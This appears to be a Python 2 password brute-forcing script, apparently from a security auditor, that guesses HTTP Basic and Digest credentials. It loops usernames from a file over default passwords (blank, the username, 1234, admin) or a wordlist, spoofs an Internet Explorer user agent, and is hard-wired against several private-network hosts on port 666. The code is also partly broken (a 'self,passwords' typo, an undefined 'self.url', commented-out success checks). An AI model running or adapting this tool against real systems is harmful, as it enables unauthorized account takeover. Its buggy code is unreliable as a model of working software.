#!/usr/bin/python
#jolmos@isecauditors.com

import urllib
import urllib2
import base64
import re

class Auth():
	def __init__(self):
		self.headers = {}
		self.opn = urllib2.build_opener()
		self.auth = None
		self.authHash = None
		self.addHeader('User-agent','Microsoft Internet Explorer 6.0')

	def addHeader(self,header,value):
		self.headers.update({header:value})

	def setAuth(self,mode,user,passwd):
		self.auth = mode
		self.authHash = base64.encodestring('%s:%s' % (user, passwd))[:-1]

	def go(self,url):
		req = urllib2.Request(url)
		for k in self.headers.keys():
			req.add_header(k,self.headers[k])

		if self.auth:
			req.add_header("Authorization",self.auth+' '+self.authHash)		
		try:
			hndl = self.opn.open(req)
			html = hndl.read()		
		except:	
			html = ""
		
		return html





class AuthBruteForce(Auth):
	'''
		Si solo se cargan usuarios, se probaran los passwords basicos
		(password blanco, mismos password que user, 1234, asdf, adm y admin)
	'''
	def __init__(self):
		Auth.__init__(self)
		self.users = []
		self.passwords = []
		self.basicPasswords = ['','','1234','asdf','adm','admin']
		self.badguy = ''
		
	def loadUsers(self,file):
		fd = open(file,'r')
		users = fd.readlines()
		fd.close()
		for i in range(0,len(users)):
			users[i] = users[i].replace('\r','').replace('\n','')
		self.users = users
		
	def loadPasswords(self,file):
		fd = open(file,'r')
		pwd = fd.readlines()
		fd.close()
		for i in range(0,len(pwd)):
			pwd[i] = pwd[i].replace('\r','').replace('\n','')
		self.passwords = pwd

	def brute(self,url):
		if len(self.passwords) == 0:
			for u in range(0,len(self.users)):
				self.basicPasswords[0] = self.users[u]
				for p in range(0,len(self.basicPasswords)):
					self.setAuth('basic',self.users[u],self.basicPasswords[p])
					html = self.go(url)
					print html
					'''
					if not re.findall(badguy,html):
						print "User: %s Passwd: %s" % (self.users[u],self.basicPasswords[p])
						return	
					'''
						
			
		else:
			#pwd wordlist mode
			for u in range(0,len(self.users)):
				for p in range(0,len(self,passwords)):
					self.setAuth('digest',self.users[u],self.passwords[p])
					html = self.go(self.url)
					'''
					if not re.findall(badguy,html):
						print "User: %s Passwd: %s" % (self.users[u],self.passwords[p])
						return
					'''
						

		

a = AuthBruteForce()
a.loadUsers('users.txt')
a.brute('http://192.168.4.12:666')
a.brute('http://192.168.4.13:666')
a.brute('http://192.168.4.16:666')
a.brute('http://192.168.4.17:666')
a.brute('http://192.168.4.18:666')
a.brute('http://192.168.5.4:666')
a.brute('http://192.168.5.5:666')


